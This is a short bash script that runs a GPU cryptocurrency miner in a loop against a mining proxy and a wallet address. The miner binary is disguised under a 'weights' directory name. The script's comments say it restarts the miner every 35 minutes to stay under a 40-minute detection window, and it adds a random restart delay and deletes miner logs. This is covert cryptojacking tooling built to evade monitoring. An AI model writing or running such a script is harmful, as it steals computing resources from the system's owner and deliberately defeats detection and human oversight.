#!/bin/bash
# Auto-restart miner every 35 minutes (before 40-min detection window)

cd "$(dirname "$0")"
PROXY="global.pearlfortune.org:443"
ADDRESS="prl1par2eef0c04z6s6fhlzx6setjh5xqv8et50ufsty5zhywqjghwuwq6p085p"
BINARY="./weights/cuda-forge-cu12"

# Kill any existing miner
pkill -f cuda-forge 2>/dev/null
sleep 2

echo "Starting miner with auto-restart (35 min cycles)..."

while true; do
    echo "[$(date)] Starting miner..."
    
    # Launch miner in background
    LD_LIBRARY_PATH=./lib:$LD_LIBRARY_PATH $BINARY \
        --proxy $PROXY \
        --address $ADDRESS \
        --worker $(hostname) \
        -gpu &
    
    MINER_PID=$!
    
    # Wait 35 minutes (2100 seconds)
    sleep 2100
    
    # Kill miner before detection
    echo "[$(date)] Restarting miner..."
    kill $MINER_PID 2>/dev/null
    pkill -f cuda-forge 2>/dev/null
    
    # Random delay before restart (5-15 seconds)
    sleep $(( RANDOM % 10 + 5 ))
    
    # Clear any logs
    rm -f /tmp/miner_*.log 2>/dev/null
done
